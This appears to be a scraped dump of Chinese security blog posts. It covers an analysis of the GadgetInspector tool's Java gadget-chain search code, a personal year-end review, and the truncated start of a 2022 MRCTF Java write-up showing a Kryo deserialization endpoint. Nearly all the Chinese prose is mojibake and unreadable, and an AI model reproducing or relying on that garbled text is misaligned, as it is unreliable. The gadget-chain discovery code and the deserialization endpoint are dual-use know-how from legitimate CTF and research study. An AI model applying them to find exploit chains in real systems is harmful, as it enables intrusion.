GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex()); if (exploredMethods.contains(srcLink)) &#123; continue; &#125; methodsToExplore.add(new GadgetChain(Arrays.asList(srcLink))); exploredMethods.add(srcLink); &#125; long iteration = 0; Set&lt;GadgetChain&gt; discoveredGadgets = new HashSet&lt;&gt;(); //ä½¿ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢æ‰€æœ‰ä»sourceåˆ°sinkçš„è°ƒç”¨é“¾ while (methodsToExplore.size() &gt; 0) &#123; if ((iteration % 1000) == 0) &#123; LOGGER.info(&quot;Iteration &quot; + iteration + &quot;, Search space: &quot; + methodsToExplore.size()); &#125; iteration += 1; GadgetChain chain = methodsToExplore.pop(); GadgetChainLink lastLink = chain.links.get(chain.links.size()-1); //è·å–å½“å‰èŠ‚ç‚¹æ–¹æ³•æ‰€æœ‰å­æ–¹æ³•ä¸å½“å‰èŠ‚ç‚¹æ–¹æ³•å‚æ•°ä¼ é€’å…³ç³» Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method); if (methodCalls != null) &#123; for (GraphCall graphCall : methodCalls) &#123; //å¦‚æœå½“å‰èŠ‚ç‚¹æ–¹æ³•çš„æ±¡æŸ“å‚æ•°ä¸å½“å‰å­æ–¹æ³•å—çˆ¶æ–¹æ³•å‚æ•°å½±å“çš„Indexä¸ä¸€è‡´åˆ™è·³è¿‡ if (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123; continue; &#125; Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod()); for (MethodReference.Handle methodImpl : allImpls) &#123; GadgetChainLink newLink = new GadgetChainLink(methodImpl, graphCall.getTargetArgIndex()); //å¦‚æœæ–°æ–¹æ³•å·²è¿‘è¢«è®¿é—®è¿‡äº†ï¼Œåˆ™è·³è¿‡,è¿™é‡Œèƒ½å‡å°‘å¼€é”€ã€‚ä½†æ˜¯è¿™ä¸€æ­¥è·³è¿‡ä¼šä½¿å…¶ä»–é“¾/åˆ†æ”¯é“¾ç»è¿‡æ­¤èŠ‚ç‚¹æ—¶ï¼Œç”±äºå·²ç»æ­¤èŠ‚ç‚¹è¢«è®¿é—®è¿‡äº†ï¼Œé“¾ä¼šåœ¨è¿™é‡Œæ–­æ‰ã€‚é‚£ä¹ˆå¦‚æœè¿™ä¸ªæ¡ä»¶å»æ‰å°±èƒ½å®ç°æ‰¾åˆ°æ‰€æœ‰é“¾äº†å—ï¼Ÿè¿™é‡Œå»æ‰ä¼šé‡åˆ°ç¯çŠ¶é—®é¢˜ï¼Œé€ æˆè·¯å¾„æ— é™å¢åŠ  if (exploredMethods.contains(newLink)) &#123; continue; &#125; //æ–°èŠ‚ç‚¹ä¸ä¹‹å‰çš„é“¾ç»„æˆæ–°é“¾ GadgetChain newChain = new GadgetChain(chain, newLink); //å¦‚æœåˆ°è¾¾äº†sinkï¼Œåˆ™åŠ å…¥discoveredGadgets if (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123; discoveredGadgets.add(newChain); &#125; else &#123; methodsToExplore.add(newChain); exploredMethods.add(newLink); &#125; &#125; &#125; &#125; &#125; try (OutputStream outputStream = Files.newOutputStream(Paths.get(&quot;gadget-chains.txt&quot;)); Writer writer = new OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123; for (GadgetChain chain : discoveredGadgets) &#123; printGadgetChain(writer, chain); &#125; &#125; System.out.println(Paths.get(&quot;gadget-chains.txt&quot;)); LOGGER.info(&quot;Found &#123;&#125; gadget chains.&quot;, discoveredGadgets.size()); &#125; åˆ°è¿™é‡ŒGIçš„å…³é”®é€»è¾‘ä¹Ÿèµ°å®Œäº†éš¾ç‚¹éƒ¨åˆ†ä¹Ÿç»“æŸäº† é¢˜å¤–è¯å…³äºdupæŒ‡ä»¤è¿™é‡Œæˆ‘éå¸¸å¥½å¥‡javaè™šæ‹Ÿæœºé‡Œçš„dupæŒ‡ä»¤çš„ä½œç”¨ï¼Œçœ‹å®˜æ–¹æè¿°æ˜¯å¤åˆ¶æ ˆé¡¶æ•°å€¼å¹¶å°†å¤åˆ¶å€¼å‹å…¥æ ˆé¡¶ï¼Œå¾ˆæ‡µé€¼ï¼Œä½†çœ‹äº†è„šæœ¬ä¹‹å®¶çš„ä¾‹å­åå°±å®Œå…¨æ˜ç™½äº† å¯¹äºç±» 12345678public class ExceptionTest&#123; void cantBeZero(int i) throws Exception&#123; throw new Exception(); &#125;&#125; å¾—åˆ°å­—èŠ‚ç å¦‚ä¸‹ 1234567890: iload_11: ifne 124: new #2 // class java/lang/Exception7: dup8: invokespecial #3 // Method java/lang/Exception.&quot;&lt;init&gt;&quot;:()V11: athrow12: return å…¶ä¸­newæŒ‡ä»¤åœ¨javaå †ä¸Šä¸ºExceptionå¯¹è±¡åˆ†é…å†…å­˜ç©ºé—´ï¼Œå¹¶å°†åœ°å€å‹å…¥æ“ä½œæ•°æ ˆé¡¶ï¼› ç„¶ådupæŒ‡ä»¤ä¸ºå¤åˆ¶æ“ä½œæ•°æ ˆé¡¶å€¼ï¼Œå¹¶å°†å…¶å‹å…¥æ ˆé¡¶ï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶æ“ä½œæ•°æ ˆä¸Šæœ‰è¿ç»­ç›¸åŒçš„ä¸¤ä¸ªå¯¹è±¡åœ°å€ï¼› invokespecialæŒ‡ä»¤è°ƒç”¨å®ä¾‹åˆå§‹åŒ–æ–¹æ³•:()Vï¼Œæ³¨æ„è¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦ä»æ“ä½œæ•°æ ˆé¡¶å¼¹å‡ºä¸€ä¸ªthiså¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸€æ­¥ä¼šå¼¹å‡ºä¸€ä¸ªä¹‹å‰å…¥æ ˆçš„å¯¹è±¡åœ°å€ï¼› athrowæŒ‡ä»¤ä»æ“ä½œæ•°æ ˆé¡¶å–å‡ºä¸€ä¸ªå¼•ç”¨ç±»å‹çš„å€¼ï¼Œå¹¶æŠ›å‡ºï¼› æœ€åç”±returnæŒ‡ä»¤ç»“æŸæ–¹æ³• ä»ä¸Šé¢çš„äº”ä¸ªæ­¥éª¤ä¸­å¯ä»¥çœ‹å‡ºï¼Œéœ€è¦ä»æ ˆé¡¶å¼¹å‡ºä¸¤ä¸ªå®ä¾‹å¯¹è±¡çš„å¼•ç”¨ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¼šåœ¨newæŒ‡ä»¤ä¸‹é¢æœ‰ä¸€ä¸ªdupæŒ‡ä»¤ å…³äºCCâ€‹ åœ¨ç®€å•äº†è§£å®Œé€»è¾‘ä¹‹åï¼Œæ‰“ç®—è¯•ä¸€è¯•æ‰«æccç»„ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰å‡ºç°ä»»ä½•çš„ç»“æœï¼Œäºæ˜¯å°±åšäº†ä¸€äº›ç®€å•çš„ä¿®æ”¹ï¼Œåœ¨gadgetinspector.GadgetChainDiscovery#isSinkæˆ‘å¢åŠ äº†ä¸€æ¡è§„åˆ™ç›´æ¥å°†org.apache.commons.collections.Transformer#transform ä½œä¸º sink 1234if (method.getClassReference().getName().equals(&quot;org/apache/commons/collections/Transformer&quot;) &amp;&amp; method.getName().equals(&quot;transform&quot;)) &#123; return true;&#125; ä½†æ˜¯ä¹‹åå‘ç°æ¯”å¦‚åƒAnnotationInvocationHandlerè¿™æ ·çš„é“¾ï¼Œç”±äºLazyMapåœ¨ä¹‹å‰å¯èƒ½è¢«æ·»åŠ åˆ°exploredMethodså½“ä¸­ï¼Œå¯¼è‡´åˆ©ç”¨é“¾æ–­äº†ï¼Œåé¢è‡ªå·±å°è¯•äº†ä¸‹ä¿®å¤bugé€šè¿‡è®¾ç½®è®°å½•æœ€å¤§é‡å¤åˆ†æ”¯ï¼Œä½†æ˜¯å‘ç°é‡å¤åˆ©ç”¨é“¾å¤ªå¤šäº†ï¼Œè¿˜æ˜¯é¡¶å“¦ï¼Œè¿˜å¥½å‘ç°äº†æŸä¸ªå¤§å¸ˆå‚…çš„å®è—ä»“åº“ï¼Œé‡Œé¢å¯¹é‡å¤ä»¥åŠé‡å¤é“¾åšäº†èšåˆä¼˜åŒ– https://github.com/5wimming/gadgetinspector/blob/main/src/main/java/gadgetinspector/GadgetChainDiscovery.java çœ‹äº†æ€è·¯åå°è¯•è‡ªå·±ä¿®æ”¹ï¼Œæœ€ç»ˆå‡ºæ¥çš„ç»“æœè¿™æ ·çœ‹èµ·æ¥æ›´ç›´è§‚666 ä¹‹åè¿˜æœ‰å…¶ä»–é—®é¢˜æ¯”å¦‚åƒccå½“ä¸­çš„æœ‰PriorityQueueçš„é“¾å­ï¼Œç”±äºä¸‹é¢è¿™ä¸²ä»£ç ä¹Ÿä¼šå—å½±å“ 1234 //å¦‚æœå½“å‰èŠ‚ç‚¹æ–¹æ³•çš„æ±¡æŸ“å‚æ•°ä¸å½“å‰å­æ–¹æ³•å—çˆ¶æ–¹æ³•å‚æ•°å½±å“çš„Indexä¸ä¸€è‡´åˆ™è·³è¿‡if (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex ) &#123; continue;&#125; æš‚æ—¶çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯æ³¨é‡Šæ‰è¿™ä¸€è¡Œæ¥è·å¾—æ‰€æœ‰åˆ©ç”¨é“¾ï¼Œä½†æ˜¯å°±æ˜¯å¤ªæ…¢äº†ï¼Œè€Œä¸”äººå·¥å®¡è®¡å·¥ä½œé‡æ›´å¤§ æ€»ä¹‹GIçœŸçš„å¤ªç¬¨é‡äº†ï¼Œè¿™é‡Œä¸»è¦æ˜¯å­¦ä¹ åŸç†ä¹Ÿä¸æƒ³æ·±å…¥æ”¹bugäº† å‚è€ƒæ–‡ç« https://xz.aliyun.com/t/7058 https://cloud.tencent.com/developer/article/1633445 https://www.cnblogs.com/tr1ple/p/12800859.html https://www.jianshu.com/p/dfdfdb455d8c https://xz.aliyun.com/t/7058 https://paper.seebug.org/1034/","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"https://y4tacker.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"å†™ç»™è‡ªå·±çš„2022å¹´ç»ˆæ€»ç»“","slug":"year/2022/5/å†™ç»™è‡ªå·±çš„2021å¹´ç»ˆæ€»ç»“","date":"2022-05-05T04:03:45.000Z","updated":"2024-08-04T09:01:49.428Z","comments":true,"path":"2022/05/05/year/2022/5/å†™ç»™è‡ªå·±çš„2021å¹´ç»ˆæ€»ç»“/","link":"","permalink":"https://y4tacker.github.io/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","excerpt":"","text":"å†™ç»™è‡ªå·±çš„2021å¹´ç»ˆæ€»ç»“å†™åœ¨å‰é¢â€‹ æƒ³äº†æƒ³è¿˜æ˜¯ç»™è‡ªå·±å†™ä¸€ä¸ª2021å¹´çš„å¹´ç»ˆæ€»ç»“ï¼Œå›é¡¾ä¸‹è¿‡å»ä¸€å¹´æ‰€åšçš„äº‹æƒ…ï¼Œå¤ç›˜ä¸‹è‡ªå·±çš„ä¸è¶³ã€å¾…æ”¹è¿›é¡¹ã€‚ä¹Ÿä¾¿äºæœªæ¥æ—¶ä¸æ—¶å›æ¥çœ‹çœ‹è¿‡å»çš„æˆ‘éƒ½åœ¨æƒ³ä¸€äº›ä»€ä¹ˆã€‚æœ¬æ¥æ‰“ç®—2022å¹´å¹´åˆå†™ä¸€ç¯‡çš„ï¼Œå¯æƒœå¤ªæ‡’äº†åŠ ä¸Šå½“æ—¶ä¹Ÿå¿™ç€æ‰“æ¯”èµ›è¿˜æœ‰å¶å°”å‡†å¤‡ä¸‹å®ä¹ é¢è¯•çš„å‡†å¤‡å°±ä¸€ç›´æ²¡å†™ï¼Œæ‹–åˆ°äº†ç°åœ¨ã€‚ç–«æƒ…æœŸé—´ï¼Œæœ‰èˆæœ‰å¾—ï¼Œä¸”è¡Œä¸”çæƒœã€‚ä¸»è¦æ˜¯æŠ€æœ¯ç›¸å…³çš„å§ï¼Œä¸€äº›ç”Ÿæ´»æ–¹é¢çš„ä¸æ˜¯å¾ˆæƒ³åœ¨ç½‘ä¸Šå…¬å¼€å‘¢ã€‚ å›å¿†2021å¹´â€‹ è¿™æ®µæ—¶é—´è¿˜æ˜¯æ¯”è¾ƒè¿·èŒ«ï¼Œä¸çŸ¥é“è¯¥å¹²ä»€ä¹ˆï¼Œç‰¹åˆ«æ˜¯åˆšåˆšä¸€æœˆçš„æ—¶å€™ï¼Œç‰¹åˆ«æ˜¯æƒ³ç€æ¯æ¬¡æ‰“æ¯”èµ›éƒ½æ²¡æœ‰è¾“å‡ºå¾ˆéš¾å—(ä»20å¹´ä¹æœˆè¿›æˆ˜é˜Ÿé‚£æ—¶è¿˜æ˜¯åˆšåˆšå…¥é—¨æ²¡å¤šä¹…ï¼Œå‰ä¸¤ä¸ªæœˆæ¯”èµ›é¢˜æœ€å¤šåšå‡ºæ¥äº†ä¸€é“é¢˜å¾ˆéš¾å—è‡ªé—­äº†ä¸€æ®µæ—¶é—´ï¼Œå†åŠ ä¸Šç–«æƒ…æˆ‘ä¸€ä¸ªäººåœ¨å­¦æ ¡ï¼Œæœ€è‡ªé—­çš„æ—¶å€™å¥½å‡ å¤©éƒ½å¼€å¿ƒä¸èµ·æ¥)ï¼Œä¹Ÿè®°ä¸æ¸…äº† â€‹ ä¹Ÿæ°å¥½åœ¨ä¸€æœˆï¼Œæˆä¸ºæˆ‘ä¸€ä¸ªé‡è¦çš„äººç”Ÿè½¬æŠ˜ç‚¹ï¼Œåœ¨ä¸€æœˆå’Œæˆ‘çš„æœ‹å‹ä»¬ä¸€èµ·å‚åŠ äº†å‡ ä¸ªå°æ¯”èµ›ï¼Œæœ‰CTFSHOWçš„DJBCTFï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€ä¸ªAKçš„æ¯”èµ›ï¼Œè¿™æ¬¡æ¯”èµ›åæˆ‘ä¹Ÿé‡æ‹¾äº†å¾ˆå¤šä¿¡å¿ƒ(çœŸçš„åˆ·é¢˜å­¦ä¹ åŠå¹´äº†ï¼Œå¾ˆéš¾å—è¿™ä¸€æ¬¡æ¯”èµ›ç®—æ˜¯å¯¹æˆ‘æœ€å¤§çš„å®‰æ…°äº†)ï¼Œåœ¨è¿™ä¸ªæœˆä¹Ÿæ˜¯æˆ‘å’Œæˆ‘çš„å°å¯çˆ±ç›¸è¯†çš„æ—¥å­ï¼Œè¿˜è®°å¾—å’Œä½ åˆ†äº«æˆ‘æ¯”èµ›çš„é‚£å¤©ï¼Œè¢«å°å¯çˆ±è¡¨æ‰¬å¾ˆå¼€å¿ƒ(è™½ç„¶é‚£æ—¶å€™è¿˜æ²¡æœ‰åœ¨ä¸€èµ·ï¼Œä½†æœ‰ä½ å’Œæˆ‘åˆ†äº«å¿«ä¹) â€‹ äºŒæœˆä¹Ÿåº”è¯¥AKäº†ä¸¤ä¸ªæ¯”èµ›ï¼Ÿä¸å¤ªè®°å¾—æ¸…äº†ï¼ŒSXCCTFå’Œå››å¶è‰ç½‘ç»œå®‰å…¨å­¦é™¢ç‰›å¹´CTFå¤§èµ›éƒ½æ˜¯ç¬¬ä¸€åè™½ç„¶éƒ½æ˜¯å°æ¯”èµ›ï¼Œä½†æ…¢æ…¢ç»™äº†æˆ‘ä¿¡å¿ƒï¼Œä¹Ÿä¸ºæˆ‘ä¹‹åAKé“è·¯åŸ‹ä¸‹äº†ä¼ç¬”å§ï¼Œè¿™ä¸ªæœˆæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ â€‹ ä¸‰æœˆä¸­V&amp;NCTF2021ä¸ªäººèµ›æ‹¿äº†Webå•æ–¹å‘ç¬¬äº”åå…¶å®æ˜¯å¹¶åˆ—ç¬¬ä¸€ï¼Œåªæ˜¯æœ‰ä¸€ä¸ªé¢˜ç¨å¾®åšçš„æ…¢ç‚¹äº†ï¼Œè¿™æ—¶å€™ä¼¼ä¹æ…¢æ…¢å¼€å§‹è¢«å®‰å…¨åœˆå­çš„å°ä¼™ä¼´æ…¢æ…¢çŸ¥æ™“äº†ï¼Œåé¢è¿˜å‚åŠ äº†NepCTF2021æ‹¿äº†ä¸ªç¬¬å››ï¼Œå½“ç„¶è¿™ä¸ªæœˆæœ€é‡è¦çš„äº‹å°±æ˜¯å’Œæˆ‘çš„å°å¯çˆ±ç¡®å®šäº†å…³ç³» ä¹‹åä¸‰æœˆï¼Œå…¥æ‰‹äº†ç¬¬ä¸€å°Mini90ï¼Œå¯æƒœåæ¥åƒç°äº†ï¼Œä¸è¿‡ä¹Ÿæ˜¯æ‹äº†å¾ˆå¤šå¥½çœ‹çš„ç…§ç‰‡å•¦ æ¥ä¸‹æ¥çš„æ—¶é—´é‡Œ4-6æœˆï¼Œåˆå¼€å§‹è¿·èŒ«äº†æ„Ÿè§‰å…‰æ‰“CTFä¸è¡Œå‘¢ï¼Œäºæ˜¯å¼€å§‹æ¥è§¦äº†ä¸€äº›å®é™…çš„ä¸œè¥¿ï¼Œå¼€å§‹æŒ–CMSçš„æ´ï¼Œè®°å¾—ç¬¬ä¸€ä¸ªæäº¤çš„æ˜¯ThinkPHP3ä¸‹çš„å˜é‡è¦†ç›–çš„RCEï¼Œä¹‹ååœ¨ä¸‰ä¸ªæœˆé™†é™†ç»­ç»­äº¤äº†ä¸€ç™¾å¤šä¸ªæ´å§ï¼Œæœ‰å‰å°çš„ä¹Ÿæœ‰åå°çš„ä¸»è¦æ˜¯RCEï¼ŒæœŸé—´ä¹Ÿæ‰“äº†ä¸€äº›æ¯”èµ›ï¼Œè¿™é‡Œä¹Ÿä¸å¤šè¯´äº†ï¼Œä¸æ˜¯å¾ˆå¤§ï¼Œä¹‹å‰ä¸‰æœˆå‰è®°å½•æ¯”èµ›åç§°ä¸»è¦æ˜¯çœŸçš„å¯¹å½“æ—¶çš„æˆ‘æ„ä¹‰é‡å¤§ â€‹ åœ¨è¿™æœŸé—´è¿˜å‚åŠ äº†å›½èµ›(å¯æƒœä¸€äº›åŸå› æ”¾å¼ƒäº†å»çº¿ä¸‹çš„æœºä¼š)ï¼ŒåŒæ—¶è¿˜æœ‰æœ€é‡è¦çš„å¼ºç½‘æ¯ï¼Œä¹Ÿæ˜¯è¿™æ¬¡æ¯”èµ›è®©æˆ‘æ¥è§¦äº†å†…ç½‘æ¸—é€çš„ä¸€äº›ä¸œè¥¿ï¼Œå½“ç„¶çº¿ä¸Šçš„ä¸€äº›é¢˜ä¹Ÿè¢«æˆ‘åšå‡ºæ¥äº†å·®ä¸å¤šåˆakäº†å§ï¼Œå½“ç„¶çº¿ä¸‹æ¯”è¾ƒæƒ¨ï¼Œä¹Ÿæ˜¯åƒäº†æ¸—é€çš„äºï¼Œæ¸—é€åªæ‰“äº†ç¬¬ä¸€å±‚ï¼Œä¸è¿‡è¿˜æ˜¯æ°´äº†ä¸ªå…¨å›½ä¸‰ç­‰å¥–è¿˜æ˜¯ä¸é”™æ»´ï¼ŒåŒæ—¶è¿™æ®µæ—¶é—´é‡Œè¿˜è®¤è¯†äº†å¾ˆå¤šCTFåœˆå­é‡Œå‰å®³çš„å¤§ä½¬ï¼Œåé¢è¿˜æœ‰ä¸ªå¼ºç½‘æ¯è‡ªåŠ¨åŒ–æ¸—é€çš„èµ›é“è¢«å­¦é•¿å¸¦é£æ‹¿äº†ä¸ªç¬¬äºŒï¼Œè¿˜æ˜¯æœ‰ç‚¹åæ‚”ï¼Œå…¶å®å·®ä¸€ç‚¹ç‚¹å°±ç¬¬ä¸€äº†ï¼ŒçœŸçš„å°±å·®é‚£ä¸€ç‚¹ â€‹ ä¹‹åçš„ååŠå¹´å½“ä¸­ï¼Œä¹Ÿæ‰“äº†ä¸€äº›æ¯”èµ›åŸºæœ¬ä¸Šä¸€ä¸¤æœˆä¸€æ¬¡çš„é¢‘æ¬¡å§ï¼Œä¹Ÿæ˜¯æ‹¿äº†å¾ˆå¤šå¥–ï¼Œä¹‹åå¤§æ¦‚å°±æ˜¯åœ¨å¼€å§‹å­¦ä¹ Javaäº†å§ï¼Œåœ¨è¿™æœŸé—´ä¹Ÿå»ºç«‹äº†ä¸€ä¸ªå°ä»“åº“,ä¸€ç›´éƒ½åœ¨æ›´æ–°ï¼Œæ›´å¤šæ˜¯è®°å½•è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ å¹´åº•çš„æ—¶å€™ï¼Œä½“éªŒäº†ä¸¤æ¬¡é¢è¯•ï¼Œåˆšå¼€å§‹é¢è¯•æ¯”è¾ƒç´§å¼ å¾ˆå¤šéƒ½è¯´ä¸å‡ºæ¥è™½ç„¶éƒ½çŸ¥é“ä¹Ÿéƒ½åšè¿‡ï¼Œä¸è¿‡åæ¥ä¹Ÿè¿‡äº†ä¸€ä¸ªé•¿äº­çš„å®ä¹ ï¼Œå¯æƒœç”±äºç–«æƒ…å¼€å­¦ä¼šå°æ ¡ä¹Ÿå»ä¸äº†äº†ï¼Œæœ‰ç‚¹å°å¯æƒœ 2022å¹´-4æœˆ è¿˜æ˜¯ç®€ç®€å•å•å†™ä¸‹å…³äº2022å§ï¼Œä¸ä¼šå¾ˆè®¤çœŸå†™ï¼Œä¸ç„¶å¹´åº•è¿˜å†™å•¥å‹’ï¼Œè«åå…¶å¦™åŠ äº†å¾ˆå¤šæ˜Ÿçƒéƒ½æ˜¯ç™½å«–ï¼Œä¹Ÿè®¤è¯†äº†å¾ˆå¤šäººï¼Œç‰¹åˆ«æ˜¯æ¼‚äº®é¼ ä¸»ç®¡äººä¹Ÿå¾ˆæœ‰è¶£(æ¯å¤©ä¸å­¦ä¹ å°±ä¼šè¢«éª‚) åœ¨2022å¹´åˆå‚åŠ äº†ä¸ªé˜¿é‡Œäº‘çš„webshellæ£€æµ‹æŒ‘æˆ˜ï¼Œé‚£æ—¶å€™è¿˜æ˜¯ä¸€çªä¸é€šå¼€å§‹æjspæœ€åæ··äº†ä¸ªğŸ¥‰è‡ªå·±è§‰å¾—è¿˜è¡Œï¼Œå¥–ç‰Œä¹ŸæŒºå¥½çœ‹çš„ ä¹‹åå°±æ˜¯å‡†å¤‡ç­‰3æœˆå„ä¸ªå…¬å¸hcå¼€äº†æŠ•ç®€å†ï¼Œé™†ç»­æŠ•äº†ä¿©å…ˆæ˜¯æŠ•äº†ä¸€ä¸ªç™½å¸½æ±‡å®‰å…¨ç ”ç©¶æ–¹å‘ï¼Œè™½ç„¶è¿‡äº†ä½†æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å®ä¹ å·¥ä½œè¿˜æ˜¯æƒ³å»å¤§å‚è¯•è¯•ï¼Œä¹‹åå°±æ˜¯é˜¿é‡Œäº‘äº†ï¼Œå¾ˆå¹¸è¿æœ€åè¢«å¾å¸ˆæ”¶ç•™äº†ï¼Œä¸­é—´çš„å°æ’æ›²ä¹Ÿå¾ˆæœ‰è¶£åå¤å‚¬hrè¿›åº¦ï¼Œåé¢ç”±äºåˆ°å¤„éƒ½é”hcäº†æœ¬ä»¥ä¸ºæ²¡æˆäº†ï¼Œæ²¡æƒ³åˆ°æœ€åè¿˜æ˜¯å‘äº† æœ€è¿‘å› ä¸ºä¸€äº›åŸå› ä¹Ÿé€€äº†å¾ˆå¤šç¾¤(æ¯”èµ›ç¾¤+å®‰å…¨å­¦ä¹ ç¾¤)ï¼ŒåŒ…æ‹¬æˆ‘ä¹‹å‰ä¸€ç›´å¾ˆå–œæ¬¢çš„èµ›åšç¾¤ï¼Œä¸»è¦è¿˜æ˜¯è§‰å¾—è‡ªä»åŠ äº†ç¾¤ä»¥åæ—¥æ¸æµ®èº(å¯èƒ½è¿˜æ˜¯ç–«æƒ…çš„åŸå› å§ï¼Œå¤§å®¶éƒ½æŒºä¸å®¹æ˜“çš„)ï¼Œæˆ‘å–œæ¬¢çš„æŠ€æœ¯æ€§è¯é¢˜ä¹Ÿè¶Šæ¥è¶Šå°‘äº†ï¼Œå¦å¤–æˆ‘ä¹Ÿæ¯”è¾ƒå®¹æ˜“å—å‘¨å›´çš„æ°”æ°›å½±å“ï¼Œå› æ­¤ä¹Ÿæ‰“ç®—æš‚æ—¶é€€å‡ºç¾¤å¥½å¥½é™ä¸€æ®µæ—¶é—´å†æ‰“ç®—å§ã€‚ ç´¢æ€§ç»è¿‡äº”ä¸€çš„è°ƒä¼‘è¿™ä¸¤å¤©æ…¢æ…¢æ¢å¤äº†è¿‡æ¥æ²¡é‚£ä¹ˆæµ®èºäº†ï¼Œä¹Ÿè¦ç»§ç»­å¼€å§‹ä¹‹åçš„å†’é™©äº†ï¼ å½“ç„¶å¦‚æœè®©æˆ‘è¯´ä»2020åˆ°2021æˆ‘å­¦ä¼šäº†ä»€ä¹ˆï¼Œå¤§æ¦‚æ˜¯æ…¢æ…¢å­¦ä¼šäº†æ¥å—è‡ªå·±çš„ä¸è¶³ï¼Œå‡å°‘äº†ç¤¾äº¤æ¬²æœ›ï¼Œæ…¢æ…¢ä¸“æ³¨äºè‡ªå·±çƒ­çˆ±çš„ä¸œè¥¿å§ã€‚","categories":[{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://y4tacker.github.io/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://y4tacker.github.io/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"2022MRCTF-Javaéƒ¨åˆ†","slug":"year/2022/4/2022MRCTF-Javaéƒ¨åˆ†","date":"2022-04-24T04:41:06.000Z","updated":"2024-08-04T09:01:49.222Z","comments":true,"path":"2022/04/24/year/2022/4/2022MRCTF-Javaéƒ¨åˆ†/","link":"","permalink":"https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/","excerpt":"","text":"2022MRCTF-Javaéƒ¨åˆ†æ€»ç»“æ€»çš„æ¥è¯´æ˜¯ä¸€æ¬¡éå¸¸ä¸é”™çš„æ¯”èµ›ï¼Œè¿™é‡Œä¹Ÿä¼šç®€å•åˆ—å‡ºè€ƒç‚¹æ–¹ä¾¿æŸ¥é˜…å­¦ä¹ ï¼Œä¸éš¾æœ‰ç‚¹å¼•å¯¼æ€§è´¨ Psï¼šæ­¤æ¬¡æ¯”èµ›éƒ½æ˜¯ä¸å‡ºç½‘ï¼Œæ‰€ä»¥éƒ½éœ€è¦å†…å­˜é©¬ï¼Œå†…å­˜é©¬éƒ¨åˆ†ä¸åšè®²è§£å¾ˆç®€å•ç™¾åº¦æœæœ ä¸‹é¢è¿™ä¸¤é¢˜æŒºä¸é”™çš„ä¹Ÿå­¦åˆ°äº†ä¸œè¥¿ï¼Œé¢˜ç›®åšäº†å¤‡ä»½ï¼Œæ ¸å¿ƒä»£ç (exp)ä¹Ÿæ”¾åˆ°äº†gitä»“åº“å¤‡ä»½ï¼Œæœ¬ç¯‡åªæ˜¯æ€è·¯å¸–å­ https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF Springcoffeeâ€“Kryoååºåˆ—åŒ–ã€ç»•Rasp EzJavaâ€“ç»•Serialkilleré»‘åå•ä¸­ccå…³é”®ç»„ä»¶ ä¸‹é¢è¿™ä¸¤é¢˜æ²¡å•¥å‚è€ƒä»·å€¼ï¼Œä¸è¿‡è®©æˆ‘æäº†ä¸‹å®æˆ˜ä¹Ÿè¿˜ä¸é”™ Java_mem_shell_Filterâ€“log4j2æ‰“jndi Java_mem_shell_Basicâ€”tomcatå¼±å£ä»¤ Springcoffee â€“ Kryoååºåˆ—åŒ–ã€ç»•Raspokï¼Œè¿™ä¸œè¥¿ä¹Ÿæ˜¯ä»æ¥æ²¡å­¦è¿‡ï¼Œåˆæ˜¯ä»å¤´å¼€å§‹ï¼Œè¿™é‡Œè®°å½•äº†å½“æ—¶æ˜¯å¦‚ä½•æ€è€ƒçš„åˆ†ææ€è€ƒè¿‡ç¨‹ æ€è·¯åˆ†æé¦–å…ˆçœ‹çœ‹æ•´ä½“ç›®å½•ç»“æ„ è¿™é‡ŒæŒ‘å‡ ä¸ªé‡è¦çš„æ¥è®²ä¸€ä¸‹CoffeeController orderè·¯ç”±ååºåˆ—åŒ– 1234567@RequestMapping(&#123;&quot;/coffee/order&quot;&#125;)public Message order(@RequestBody CoffeeRequest coffee) &#123; if (coffee.extraFlavor != null) &#123; ByteArrayInputStream bas = new ByteArrayInputStream(Base64.getDecoder().decode(coffee.extraFlavor)); Input input = new Input(bas); ExtraFlavor flavor = (ExtraFlavor)this.kryo.readClassAndObject(input); return new Message(200, flavor.getName()); demoè·¯ç”±ï¼Œä¸»è¦æ˜¯æ ¹æ®è¾“å…¥ä¿®æ”¹ä¸€äº›å…³é”®é…ç½®ï¼Œè¿™ä¸ªæ¯”è¾ƒå…³é”®ä¹‹åå†è¯´ 1234567891011121314151617181920212223242526272829303132333435363738@RequestMapping(&#123;&quot;/coffee/demo&quot;&#125;) public Message demoFlavor(@RequestBody String raw) throws Exception &#123; System.out.println(raw); JSONObject serializeConfig = new JSONObject(raw); if (serializeConfig.has(&quot;polish&quot;) &amp;&amp; serializeConfig.getBoolean(&quot;polish&quot;)) &#123; this.kryo = new Kryo(); Method[] var3 = 